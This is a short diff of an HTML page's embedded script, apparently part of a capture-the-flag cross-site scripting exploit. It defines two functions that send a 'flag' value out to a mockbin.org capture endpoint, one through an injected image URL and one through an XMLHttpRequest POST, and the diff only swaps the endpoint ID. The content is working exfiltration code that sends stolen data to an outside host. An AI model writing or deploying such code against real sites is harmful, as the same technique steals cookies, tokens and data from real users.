@@ -9,12 +9,12 @@
     <script>
 function sendrequ(payload){
   	var img = document.createElement('img');
-	img.src = "http://mockbin.org/bin/5827eabf-b706-47be-adb7-498676d06877?flag=" + payload;
+	img.src = "http://mockbin.org/bin/bc04f62e-58a7-4468-b5fa-51d85f87bee4?flag=" + payload;
 	document.body.appendChild(img);
 }
 function s2(payload){
 var req = new XMLHttpRequest();
-    req.open("POST", "http://mockbin.org/bin/5827eabf-b706-47be-adb7-498676d06877", true);
+    req.open("POST", "http://mockbin.org/bin/bc04f62e-58a7-4468-b5fa-51d85f87bee4", true);
     req.send("flag="+ payload);
 }
 setTimeout(function(){
